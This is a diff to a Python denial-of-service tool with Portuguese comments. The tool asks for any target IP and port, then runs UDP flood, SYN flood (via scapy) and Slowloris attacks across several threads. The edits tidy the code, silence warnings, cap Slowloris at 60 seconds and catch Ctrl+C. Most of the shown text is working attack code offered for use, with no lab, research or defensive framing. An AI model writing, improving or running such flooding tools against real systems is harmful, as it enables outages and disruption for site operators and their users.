@@ -1,8 +1,18 @@
 import socket
 import threading
 import time
+import warnings
 from scapy.all import IP, TCP, send
+from scapy.config import conf
+from cryptography.utils import CryptographyDeprecationWarning
 
+# Suprimir aviso de depreciação do TripleDES
+warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)
+
+# Caminho para o arquivo manuf (se tiver baixado manualmente)
+conf.manufdb = "C:/Users/Angelo/scapy-manuf/manuf"  # Altere esse caminho se necessário
+
+# Logo
 logo = """
  █    ██  ██▓  ▄▄▄█████▓ ██▀███   ▄▄▄      ▓█████▄ ▓█████▄  ▒█████    ██████ 
  ██  ▓██▒▓██▒  ▓  ██▒ ▓▒▓██ ▒ ██▒▒████▄    ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
@@ -16,7 +26,7 @@ logo = """
                                             ░       ░                        
 """
 
-
+# Métodos de ataque
 def udp_flood(target_ip, target_port, num_packets):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     packet = b"A" * 1024
@@ -43,18 +53,19 @@ def syn_flood(target_ip, target_port, num_packets):
 def slowloris(target_ip, target_port, num_connections):
     sockets = []
     print("[*] Iniciando Slowloris...")
-    for _ in range(num_connections):
-        try:
+    try:
+        for _ in range(num_connections):
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(4)
             s.connect((target_ip, target_port))
             s.send(b"GET / HTTP/1.1\r\n")
             s.send(f"Host: {target_ip}\r\n".encode())
             sockets.append(s)
-        except socket.error:
-            break
+    except socket.error:
+        pass
 
-    while True:
+    tempo_final = time.time() + 60  # Executa por 60 segundos
+    while time.time() < tempo_final:
         print(f"[+] Mantendo {len(sockets)} conexões vivas...")
         for s in list(sockets):
             try:
@@ -63,6 +74,7 @@ def slowloris(target_ip, target_port, num_connections):
             except socket.error:
                 sockets.remove(s)
 
+# Execução por threads
 def run_attack(method, ip, port, count, threads):
     method_map = {
         '1': udp_flood,
@@ -85,6 +97,7 @@ def run_attack(method, ip, port, count, threads):
     for t in thread_list:
         t.join()
 
+# Interface principal
 def main():
     print(logo)
     print("Escolha o método de teste:")
@@ -96,11 +109,15 @@ def main():
     method = input("Método (1-4): ").strip()
     ip = input("IP do alvo: ").strip()
     port = int(input("Porta: ").strip())
-    count = int(input("Quantidade de pacotes/conexões por thread: ").strip())
+    count = int(input("Pacotes/conexões por thread: ").strip())
     threads = int(input("Número de threads: ").strip())
 
     print(f"\n[*] Iniciando ataque no {ip}:{port} com {threads} threads...\n")
     run_attack(method, ip, port, count, threads)
 
+# Execução segura com Ctrl+C
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n[!] Ataque interrompido pelo usuário.")
